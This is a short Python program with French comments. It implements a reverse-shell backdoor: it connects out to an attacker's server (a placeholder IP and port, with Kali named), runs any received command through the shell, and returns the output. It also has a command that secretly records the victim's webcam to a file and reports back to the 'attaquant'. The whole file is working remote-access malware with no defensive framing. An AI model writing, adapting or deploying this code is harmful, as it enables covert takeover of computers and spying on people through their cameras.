import socket
import subprocess
import cv2
import os

def connect():
    # Crée une socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connecte-toi au serveur (Kali)
    s.connect(("adresse_ip", port))  # Remplace 'adresse_ip' et 'port' par les valeurs correctes
    
    while True:
        # Reçoit la commande du serveur
        command = s.recv(1024)
        
        # Si la commande contient "exit", ferme la connexion
        if "exit" in command.decode():
            s.close()
            break
        
        # Si la commande contient "capture_video", lance la capture vidéo
        elif "capture_video" in command.decode():
            capture_video(s)
        
        else:
            # Exécute la commande reçue et envoie la sortie
            cmd = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + "\n"))

def capture_video(s):
    # Ouvre la webcam (index 0 pour la première caméra)
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        s.send(str.encode("Erreur: Impossible d'accéder à la caméra.\n"))
        return

    # Définir la résolution de la vidéo
    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))

    # Enregistre la vidéo dans un fichier (avi ici, mais tu peux choisir .mp4, etc.)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')  # Codecs pour .avi
    out = cv2.VideoWriter('output_video.avi', fourcc, 20.0, (width, height))  # 20.0 -> FPS, (width, height) -> Résolution

    # Informe l'attaquant que la capture vidéo a commencé
    s.send(str.encode("Capture vidéo commencée...\n"))

    while True:
        # Capture une frame (image) de la webcam
        ret, frame = cap.read()

        if not ret:
            s.send(str.encode("Erreur: Impossible de lire la vidéo.\n"))
            break

        # Enregistre la frame dans le fichier vidéo
        out.write(frame)

        # Afficher la frame dans une fenêtre OpenCV
        cv2.imshow("Webcam Video", frame)

        # Si la touche 'q' est pressée, quitte la capture vidéo
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

    # Libère la caméra, ferme les fenêtres OpenCV et le fichier vidéo
    cap.release()
    out.release()
    cv2.destroyAllWindows()

    # Informe l'attaquant que la capture vidéo est terminée
    s.send(str.encode("Capture vidéo terminée. Le fichier est enregistré sous 'output_video.avi'.\n"))

def main():
    # Appelle la fonction de connexion
    connect()

if __name__ == "__main__":
    main()
